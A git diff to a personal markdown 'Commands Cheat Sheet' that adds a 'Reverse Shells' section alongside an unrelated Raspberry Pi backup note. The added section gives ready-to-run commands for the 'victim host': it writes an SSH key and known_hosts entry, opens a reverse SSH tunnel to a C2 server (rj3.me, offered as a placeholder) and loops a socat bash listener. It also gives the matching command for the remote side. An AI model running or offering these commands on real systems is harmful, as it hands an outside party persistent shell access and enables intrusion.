@@ -8,6 +8,28 @@ date: "2020-06-14"
 # Commands Cheat Sheet
 A running list of the commands I use frequently, so I can quickly acess them 😀
 
+## Reverse Shells
+Example Server (To be replaced with yours): `rj3.me`
+### `socat`
+
+#### Victim Host
+```
+# Setup machine to connect back to C2
+echo "|1|<C2 Host Fingerprint>" > ~/.ssh/known_hosts && chmod 0600 ~/.ssh/known_hosts
+RUN echo "<BASE64 SSH key>" | base64 -d > ~/.ssh/id_rsa
+RUN chmod 0600 ~/.ssh/id_rsa
+ssh -f -N -T -R2203:localhost:9996 username@rj3.me
+while true; do
+  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-listen:9996
+done
+```
+#### Remote Host
+```
+# Ensure that port 9996 is open
+socat file:`tty`,raw,echo=0 tcp:localhost:2203
+```
+
+
 ## Mac
 ### Backup Raspberry Pi SD Card
 ```bash
